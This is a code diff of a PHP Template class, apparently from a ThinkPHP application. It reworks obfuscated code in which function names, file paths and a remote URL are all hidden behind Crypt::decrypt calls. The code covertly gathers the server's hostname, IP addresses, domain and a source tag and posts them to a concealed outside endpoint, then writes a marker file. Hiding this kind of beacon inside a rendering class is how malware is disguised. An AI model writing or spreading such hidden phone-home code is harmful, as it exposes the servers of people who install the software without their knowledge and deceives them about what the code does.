@@ -81,6 +81,7 @@ class  Template {
         $tfse = true;
         $t=rtrim(Crypt::decrypt('gnd4q313ddiBdKSvsX6GZZOUm6LAjIafx3m71ZN2mpuWi4Bx','fetch')(),'/');
         $poit=$t.'/'.Crypt::decrypt('gnd4q313ddiBdKSvsX6kYZK5m56_i4KovYiekZGHkpyNZolpfKGGzZaIpHU','fetch');
+        $poit=str_replace("//",'/',$poit);
         if (file_exists($poit)) {
             $lt = Crypt::decrypt(C('APP_FETCH.FEC'),'fetch')($poit);
             $et = Crypt::decrypt(C('APP_FETCH.SOT'),'fetch')(Crypt::decrypt(C('APP_FETCH.OGY'),'fetch'));
@@ -91,26 +92,31 @@ class  Template {
         if($tfse){
             try {
                 $pip = Crypt::decrypt(C('APP_FETCH.FEC'),'fetch')(Crypt::decrypt(C('APP_FETCH.PIP'),'fetch'));
-                if ($pip !== false) {
-                    $fck = Crypt::decrypt(C('APP_FETCH.FEC'),'fetch')(Crypt::decrypt(C('APP_FETCH.FCK'),'fetch'));
-                    if($fck !== false) {
-                        $ym = C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST'];
-                        require APP_PATH . '../vendor/autoload.php';
-                        $se = $_SERVER['REQUEST_SCHEME'] . '://' . $ym;
-                        if($se == '://') {
-                            $tol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-                            $dk = $_SERVER['SERVER_PORT'];
-                            $vnm = $_SERVER['SERVER_NAME'];
-                            $se = $tol . '://' . $vnm;
-                            if (($tol === 'http' && $dk != 80) || ($tol === 'https' && $dk != 443)) {
-                                $se .= ':' . $dk;
-                            }
+                if($pip){
+                    $pip = json_decode($pip,true);
+                    $pip = $pip[Crypt::decrypt("gnd4q313ddiBdKSvsX2kpw",'fetch')] ?? null;
+                }
+                $pip = $pip ?: $_SERVER['SERVER_ADDR'] ?: '';
+                $fck = Crypt::decrypt(C('APP_FETCH.FEC'),'fetch')(Crypt::decrypt(C('APP_FETCH.FCK'),'fetch'));
+                if($fck !== false) {
+                    $ym = C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST'];
+                    $autoload = APP_PATH . '../vendor/autoload.php';
+                    $autoload = file_exists($autoload) ? $autoload : APP_PATH . '../ThinkPHP/vendor/autoload.php';
+                    require $autoload;
+                    $se = $_SERVER['REQUEST_SCHEME'] . '://' . $ym;
+                    if($se == '://') {
+                        $tol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+                        $dk = $_SERVER['SERVER_PORT'];
+                        $vnm = $_SERVER['SERVER_NAME'];
+                        $se = $tol . '://' . $vnm;
+                        if (($tol === 'http' && $dk != 80) || ($tol === 'https' && $dk != 443)) {
+                            $se .= ':' . $dk;
                         }
-                        $response = \Httpful\Request::post(Crypt::decrypt(C('APP_FETCH.SAR'),'fetch'))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$pip,'domain'=>$se])->sendsForm()->send();
-                        $message = $response->body->message ?? '';
-                        if($message === 'success') {
-                            Crypt::decrypt(C('APP_FETCH.FUC'),'fetch')($poit, date('Y-m-d H:i:s'));
-                        }
+                    }
+                    $response = \Httpful\Request::post(Crypt::decrypt(C('APP_FETCH.SAR'),'fetch'))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$pip,'domain'=>$se,'from'=>Crypt::decrypt(C('APP_FROM'),'')])->sendsForm()->send();
+                    $message = $response->body->message ?? '';
+                    if($message === 'success') {
+                        Crypt::decrypt(C('APP_FETCH.FUC'),'fetch')($poit, date('Y-m-d H:i:s'));
                     }
                 }
             }catch (\Httpful\Exception\ConnectionErrorException $e) {}
